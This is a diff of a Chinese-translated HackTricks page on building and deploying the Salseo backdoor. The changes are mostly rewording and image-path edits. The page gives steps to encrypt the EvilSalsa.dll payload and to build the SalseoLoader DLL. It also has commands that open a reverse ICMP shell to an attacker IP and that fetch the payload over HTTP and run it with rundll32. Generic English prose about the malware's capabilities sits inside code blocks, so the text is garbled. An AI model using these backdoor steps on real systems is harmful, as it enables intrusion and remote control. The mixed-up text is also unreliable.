@@ -4,10 +4,10 @@
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* 你在一家**网络安全公司**工作吗？想要在HackTricks中**宣传你的公司**吗？或者你想要**获取PEASS的最新版本或下载HackTricks的PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
+* 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
 * 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
 * 获取[**官方PEASS和HackTricks的衣物**](https://peass.creator-spring.com)
-* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
+* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)或**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
 * **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**
 
 </details>
@@ -30,7 +30,7 @@
 
 ## 准备后门
 
-首先，你需要对**EvilSalsa.dll**进行编码。你可以使用python脚本**encrypterassembly.py**或者编译项目**EncrypterAssembly**来进行编码：
+首先，你需要对**EvilSalsa.dll**进行编码。你可以使用python脚本**encrypterassembly.py**或者编译项目**EncrypterAssembly**：
 
 ### **Python**
 ```
@@ -49,45 +49,43 @@ Once installed on a target system, the Salseo backdoor establishes a covert comm
 
 The backdoor is capable of performing various malicious activities, including:
 
-1. **Command Execution**: The attacker can execute arbitrary commands on the infected system, giving them full control over its resources and functionalities.
+1. **Remote Access**: The attacker can gain full control over the infected system, enabling them to perform actions as if they were physically present.
 
-2. **File Manipulation**: The backdoor can create, modify, or delete files on the compromised system, allowing the attacker to plant additional malware or manipulate existing files.
+2. **Data Exfiltration**: The backdoor can steal sensitive data from the compromised system, such as login credentials, financial information, or intellectual property.
 
-3. **Keylogging**: Salseo can capture keystrokes entered by the user, enabling the attacker to gather sensitive information such as passwords and login credentials.
+3. **Keylogging**: Salseo can capture keystrokes, allowing the attacker to monitor and record user activities, including passwords and other confidential information.
 
-4. **Remote Shell**: The backdoor provides a remote shell, allowing the attacker to interact with the compromised system's command prompt or terminal remotely.
+4. **File Manipulation**: The backdoor can create, modify, or delete files on the compromised system, giving the attacker the ability to plant additional malware or tamper with existing files.
 
-5. **Data Exfiltration**: Salseo can exfiltrate sensitive data from the infected system, sending it to the attacker-controlled C2 server. This can include personal information, financial data, or intellectual property.
+5. **System Surveillance**: Salseo can gather system information, such as installed software, hardware details, and network configurations, providing the attacker with valuable insights for further exploitation.
 
 ##### Infection Vectors
 
 The Salseo backdoor can be delivered through various infection vectors, including:
 
-- **Email Attachments**: Malicious email attachments, such as infected Office documents or executable files, can deliver the backdoor payload when opened by the victim.
+1. **Phishing Emails**: Malicious attachments or links in phishing emails can lead to the installation of the backdoor when clicked or opened.
 
-- **Drive-by Downloads**: Visiting compromised or malicious websites can trigger the automatic download and execution of the Salseo backdoor.
+2. **Drive-by Downloads**: Visiting compromised or malicious websites can trigger the automatic download and execution of the backdoor without the user's knowledge.
 
-- **Exploit Kits**: Exploit kits targeting vulnerabilities in software installed on the victim's system can be used to deliver the backdoor payload.
+3. **Exploit Kits**: Salseo can be delivered through exploit kits that target vulnerabilities in outdated software or plugins.
 
-- **Social Engineering**: Techniques like phishing or spear-phishing can trick users into downloading and executing the backdoor unknowingly.
+4. **Malicious Downloads**: Users may unknowingly download and execute the backdoor when accessing pirated software, cracked games, or other illegitimate sources.
 
-##### Detection and Mitigation
+##### Detection and Prevention
 
-Detecting and mitigating the Salseo backdoor can be challenging due to its stealthy nature. However, implementing the following measures can help reduce the risk:
+Detecting and preventing the Salseo backdoor requires a multi-layered approach, including:
 
-- **Antivirus and Anti-malware Solutions**: Regularly update and use reputable antivirus and anti-malware software to detect and remove the backdoor.
+1. **Antivirus Software**: Regularly update and use reputable antivirus software to detect and remove known malware signatures.
 
-- **Patch Management**: Keep the operating system and installed software up to date with the latest security patches to prevent exploitation of known vulnerabilities.
+2. **Patch Management**: Keep operating systems, software, and plugins up to date to mitigate vulnerabilities that could be exploited by the backdoor.
 
-- **User Education**: Train users to be cautious when opening email attachments or clicking on suspicious links to minimize the risk of infection.
+3. **User Education**: Train users to recognize and avoid phishing emails, suspicious websites, and unauthorized downloads.
 
-- **Network Monitoring**: Implement network monitoring solutions to detect suspicious traffic patterns or connections to known malicious C2 servers.
+4. **Network Monitoring**: Implement network monitoring tools to detect unusual traffic patterns or connections to known malicious C2 servers.
 
-- **Firewall Configuration**: Configure firewalls to block unauthorized inbound and outbound connections, limiting the backdoor's communication capabilities.
+5. **Firewall Configuration**: Configure firewalls to block unauthorized inbound and outbound connections, limiting the backdoor's ability to communicate with the C2 server.
 
-- **System Hardening**: Apply security best practices, such as disabling unnecessary services and implementing strong passwords, to harden the system against attacks.
-
-By implementing these measures, organizations can enhance their defenses against the Salseo backdoor and minimize the potential impact of a compromise.
+By implementing these preventive measures and maintaining a proactive security posture, organizations can reduce the risk of falling victim to the Salseo backdoor and other similar malware.
 ```
 EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
 EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
@@ -149,21 +147,21 @@ SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
 
 ### 在主函数之前添加：\[DllExport]
 
-![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
 ### 为该项目安装DllExport
 
 #### **工具** --> **NuGet程序包管理器** --> **管理解决方案的NuGet程序包...**
 
-![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
 #### **搜索DllExport包（使用浏览选项卡），然后点击安装（并接受弹出窗口）**
 
-![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1).png>)
 
 在项目文件夹中会出现以下文件：**DllExport.bat**和**DllExport\_Configure.bat**
 
-### **卸载**DllExport
+### **卸载** DllExport
 
 点击**卸载**（是的，很奇怪，但相信我，这是必要的）
 
@@ -187,11 +185,11 @@ SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
 
 ### 构建解决方案
 
-选择**输出类型=类库**（项目 --> SalseoLoader属性 --> 应用程序 --> 输出类型=类库）
+选择**输出类型 = 类库**（项目 --> SalseoLoader属性 --> 应用程序 --> 输出类型 = 类库）
 
 ![](<../.gitbook/assets/image (10) (1).png>)
 
-选择**x64平台**（项目 --> SalseoLoader属性 --> 构建 --> 平台目标=x64）
+选择**x64平台**（项目 --> SalseoLoader属性 --> 构建 --> 平台目标 = x64）
 
 ![](<../.gitbook/assets/image (9) (1) (1).png>)
 
@@ -224,21 +222,11 @@ rundll32.exe SalseoLoader.dll,main
 
 CMD (Command Prompt) is a command-line interpreter in Windows operating systems. It provides a text-based interface for executing commands and managing the system. CMD can be used to perform various tasks, such as navigating through directories, running programs, and managing files and processes.
 
-CMD is a powerful tool for hackers as it allows them to execute commands and scripts on a target system. By exploiting vulnerabilities or using social engineering techniques, hackers can gain access to a system and use CMD to perform malicious activities.
+CMD is a powerful tool for hackers as it allows them to execute commands and scripts on a target system. By gaining access to CMD, hackers can exploit vulnerabilities, escalate privileges, and gain control over the target system.
 
-Some common CMD commands used by hackers include:
+To access CMD, you can open the Start menu, type "cmd" in the search bar, and press Enter. This will open the Command Prompt window, where you can start executing commands.
 
-- **netstat**: This command displays active network connections and listening ports on a system. Hackers can use this command to gather information about a target's network and identify potential vulnerabilities.
-
-- **ipconfig**: This command displays the IP configuration of a system, including the IP address, subnet mask, and default gateway. Hackers can use this command to gather information about a target's network and identify potential targets for further exploitation.
-
-- **tasklist**: This command displays a list of running processes on a system. Hackers can use this command to identify processes that may be vulnerable to exploitation or to gather information about a target's system.
-
-- **regedit**: This command opens the Windows Registry Editor, which allows hackers to view and modify registry keys and values. By modifying registry settings, hackers can gain persistence on a target system or disable security features.
-
-- **shutdown**: This command allows hackers to shut down or restart a target system. By executing this command, hackers can disrupt the normal operation of a system or cause data loss.
-
-It is important to note that the use of CMD for malicious purposes is illegal and unethical. This information is provided for educational purposes only, to raise awareness about potential security risks and to promote responsible and ethical hacking practices.
+It is important to note that CMD should only be used for legitimate purposes, such as system administration or troubleshooting. Using CMD for malicious activities is illegal and unethical.
 ```
 set pass=password
 set payload=http://10.2.0.5/evilsalsax64.dll.txt
@@ -249,12 +237,12 @@ rundll32.exe SalseoLoader.dll,main
 ```
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks 云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* 你在一家 **网络安全公司** 工作吗？想要在 HackTricks 中 **宣传你的公司** 吗？或者你想要获取 **PEASS 的最新版本或下载 HackTricks 的 PDF** 吗？请查看 [**订阅计划**](https://github.com/sponsors/carlospolop)！
-* 发现我们的独家 [**NFTs**](https://opensea.io/collection/the-peass-family) 集合 [**The PEASS Family**](https://opensea.io/collection/the-peass-family)
-* 获取 [**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
-* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或者 [**Telegram 群组**](https://t.me/peass) 或者 **关注** 我的 **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **通过向** [**hacktricks 仓库**](https://github.com/carlospolop/hacktricks) **和** [**hacktricks-cloud 仓库**](https://github.com/carlospolop/hacktricks-cloud) **提交 PR 来分享你的黑客技巧。**
+* 你在一家**网络安全公司**工作吗？想要在HackTricks中**宣传你的公司**吗？或者你想要**获取PEASS的最新版本或下载HackTricks的PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
+* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
+* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
+* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或者**关注**我在**推特**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
+* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**
 
 </details>
